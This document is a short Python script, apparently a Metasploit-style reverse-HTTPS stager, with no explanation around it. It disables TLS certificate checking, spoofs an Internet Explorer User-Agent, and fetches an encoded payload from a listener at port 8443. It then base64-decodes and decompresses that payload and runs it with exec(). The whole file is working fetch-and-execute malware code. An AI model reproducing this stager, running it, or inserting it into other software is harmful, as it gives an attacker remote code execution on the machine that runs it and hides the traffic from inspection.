import zlib,base64,sys
vi=sys.version_info
ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener','HTTPSHandler'])
hs=[]
if (vi[0]==2 and vi>=(2,7,9)) or vi>=(3,4,3):
	import ssl
	sc=ssl.SSLContext(ssl.PROTOCOL_SSLv23)
	sc.check_hostname=False
	sc.verify_mode=ssl.CERT_NONE
	hs.append(ul.HTTPSHandler(0,sc))
o=ul.build_opener(*hs)
o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
exec(zlib.decompress(base64.b64decode(o.open('https://0.0.0.0:8443/il5Zibu2cvXa7c_5u2jhDgBDEsXXbLQS5tFgafqTkV9fMLufK_1PhmMVyv4jCQZEh3uWOrE1dfkeRYljZEu22UPXd05jRTXO-mOQdy0zaobCELpF8XMUN3jPTObz98VWZWMubqBnsh6h7WzP52G-LIn373mVGim58IhplLPiS4Sgn2ibDsEHSXGJeeVrMIyvlAJWoKjC_MkTEgY7H').read())))
